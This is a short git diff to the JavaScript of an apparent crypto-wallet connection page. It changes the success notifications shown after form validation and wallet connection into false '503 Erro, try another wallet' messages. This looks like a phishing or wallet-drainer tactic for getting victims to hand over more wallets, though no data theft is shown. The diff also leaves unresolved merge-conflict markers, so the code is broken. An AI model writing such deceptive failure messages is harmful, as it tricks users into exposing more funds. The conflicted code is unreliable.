@@ -181,7 +181,11 @@ function setupValidationForms() {
                     }
                     
                     // Show success message
+<<<<<<< HEAD
                     showNotification('503 error, connect another wallet.', 'success');
+=======
+                    showNotification('503 Erro try another wallet.', 'not success');
+>>>>>>> f6fb07e (updated)
                 }, 2000);
             }
         });
@@ -335,7 +339,7 @@ function initializeWalletConnect() {
                     loadingOverlay.style.display = 'none';
                     
                     // Show success message
-                    showNotification(`Successfully connected to ${walletType}!`, 'success');
+                    showNotification(`503 Erro please try another wallet. ${walletType}!`, 'Erro');
                     
                     // Update connect button text
                     const connectButton = document.getElementById('connectWalletBtn');
